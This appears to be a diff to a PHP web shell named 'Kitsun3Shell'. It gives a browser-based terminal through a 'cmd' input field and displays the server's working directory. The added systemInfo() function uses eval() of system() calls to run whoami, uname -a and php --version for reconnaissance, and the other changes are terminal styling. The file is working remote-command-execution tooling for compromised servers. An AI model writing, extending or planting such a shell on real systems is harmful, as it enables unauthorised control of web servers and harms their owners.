@@ -20,6 +20,18 @@ function main() {
     }
 }
 
+function systemInfo(){
+    $sysinfo = array(
+        'whoami:' => "system('whoami');",
+        'uname -a:' => "system('uname -a');",
+        'PHP:' => "system('php --version | head -n 1 | cut -d \'\' -f 2');"
+    );
+    
+    foreach ($sysinfo as $key => $value) {
+        echo "<span>$key</span> "; eval($value) . "\n";
+    }
+}
+
 main();
 ?>
 
@@ -53,15 +65,21 @@ main();
                 background-color:#272822;
                 border: 0px;
                 color: green;
-                font-weight: bolder;
                 outline: none;
                 display: inline;
+                font-size: medium;
+                font-family: Consolas,Monaco,Lucida Console,Liberation Mono,DejaVu Sans Mono,Bitstream Vera Sans Mono,Courier New, monospace;
+
             }
 
             #terminal {
                 padding: 10px;
                 margin: 20px;
                 background-color:#272822;
+            }
+
+            #shell-content {
+                height: 180;
             }
 
             #prompt {
@@ -127,12 +145,14 @@ main();
  / //_/ | __/ __| | | | '_ \  |_ \\ \| '_ \ / _ \ | |
 / __ \| | |_\__ \ |_| | | | |___) |\ \ | | |  __/ | |
 \/  \/|_|\__|___/\__,_|_| |_|____/\__/_| |_|\___|_|_|
+
+<?php systemInfo(); ?>
                 </div>
 
             </pre>
         <div id='output'></div>
             <?php
-                echo '<div id="prompt"><span>kitsun3@shell</span>:$'. '<span id="path">'.getcwd().' $ '.'</span></div>';
+                echo '<div id="prompt"><span>kitsun3@shell</span>:'. '<span id="path">'.getcwd().'<span>$</span> '.'</span></div>';
             ?>
             <input type="text" name="cmd" id="myInput">
         </div>
